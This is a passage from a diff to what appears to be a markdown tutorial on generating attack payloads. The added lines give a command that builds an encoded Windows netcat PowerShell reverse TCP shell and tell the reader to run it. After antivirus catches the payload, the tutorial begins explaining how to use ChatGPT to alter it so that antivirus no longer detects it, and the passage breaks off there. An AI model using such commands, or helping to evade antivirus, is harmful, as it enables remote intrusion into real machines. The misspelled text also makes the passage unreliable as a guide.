@@ -42,3 +42,16 @@
  To understand how to generate a paylaod we will use the command 
 
     help generate
+
+• Generate a paylaod from the example for the wwindows
+
+    generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
+
+ Now try runing the generated payload in powershell
+
+</br>
+
+***◙ Improving the Payload***
+ As we can see that the paylaod has been shot down by the AV so we have to do some changes in tht so it can't be detected by the AV.
+ </br>
+ • For doingb such changes we will be using Our beloved ***"CHAT GPT"*** in such a manner >
